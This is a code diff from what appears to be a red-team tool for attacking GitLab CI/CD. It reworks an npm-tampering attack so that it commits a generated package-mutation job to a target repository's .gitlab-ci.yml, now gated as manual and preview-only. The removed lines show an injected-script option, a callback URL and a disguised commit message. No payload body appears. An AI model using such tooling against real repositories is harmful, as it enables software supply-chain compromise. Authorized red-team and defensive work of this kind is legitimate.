@@ -634,10 +634,24 @@ func runAttackC2Channel(ctx context.Context, cmd *cobra.Command, client *gitlabx
 	return nil
 }
 
-// runAttackNpmTamper injects preinstall hooks into npm packages via CI.
-func runAttackNpmTamper(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
+// runAttackPackageTamper stages a manual preview-only package mutation job by
+// default. Live publishing requires generation-time and runtime authorization.
+func runAttackPackageTamper(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
+	common := payloadgen.CommonOptions{
+		JobName: strings.TrimSpace(atkJobName),
+		Stage:   strings.TrimSpace(atkStage),
+		Image:   strings.TrimSpace(atkImage),
+		Tags:    parseTags(atkTags),
+		Manual:  true,
+	}
+	options := packageTamperOptions(common, atkNpmTamper && !atkPackageTamper)
+	yaml, err := payloadgen.GeneratePackageTamperYAML(options)
+	if err != nil {
+		return fmt.Errorf("generate package tamper payload: %w", err)
+	}
+
 	if strings.TrimSpace(atkBranch) == "" {
-		atkBranch = "gogatoz-npm-tamper"
+		atkBranch = "gogatoz-package-tamper"
 	}
 	finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
 	if berr != nil {
@@ -651,39 +665,28 @@ func runAttackNpmTamper(ctx context.Context, cmd *cobra.Command, client *gitlabx
 		return err
 	}
 	if strings.TrimSpace(atkMessage) == "" {
-		atkMessage = "build: update npm package configuration"
+		atkMessage = "test: stage authorized package tamper preview"
 	}
-	yaml := payloadgen.GenerateNpmTamperYAML(payloadgen.NpmTamperOptions{
-		Common: payloadgen.CommonOptions{
-			JobName: strings.TrimSpace(atkJobName),
-			Stage:   strings.TrimSpace(atkStage),
-			Image:   strings.TrimSpace(atkImage),
-			Tags:    parseTags(atkTags),
-			Manual:  atkManual,
-		},
-		RegistryURL:    strings.TrimSpace(atkNpmRegistry),
-		PackageName:    strings.TrimSpace(atkNpmPackage),
-		InjectedScript: strings.TrimSpace(atkNpmInjectScript),
-		CallbackURL:    strings.TrimSpace(atkWebhook),
-	})
 	if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
-		return fmt.Errorf("commit npm tamper payload: %w", err)
+		return fmt.Errorf("commit package tamper payload: %w", err)
 	}
-	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed npm tamper payload to branch %s\n", finalBranch)
+	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed manual package tamper payload to branch %s\n", finalBranch)
 	if outputJSON {
 		out := struct {
-			Branch   string `json:"branch"`
-			Registry string `json:"registry,omitempty"`
-			Package  string `json:"package,omitempty"`
+			Branch      string `json:"branch"`
+			Ecosystem   string `json:"ecosystem"`
+			Registry    string `json:"registry,omitempty"`
+			Package     string `json:"package,omitempty"`
+			LivePublish bool   `json:"live_publish"`
 		}{
-			Branch:   finalBranch,
-			Registry: strings.TrimSpace(atkNpmRegistry),
-			Package:  strings.TrimSpace(atkNpmPackage),
+			Branch: finalBranch, Ecosystem: strings.TrimSpace(options.Ecosystem),
+			Registry: strings.TrimSpace(options.RegistryURL), Package: strings.TrimSpace(options.PackageName),
+			LivePublish: options.LivePublish,
 		}
 		b, _ := json.MarshalIndent(out, "", "  ")
 		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
 		return err
 	}
-	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("npm tamper payload committed to branch %s", finalBranch))
+	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("manual package tamper payload committed to branch %s", finalBranch))
 	return nil
 }
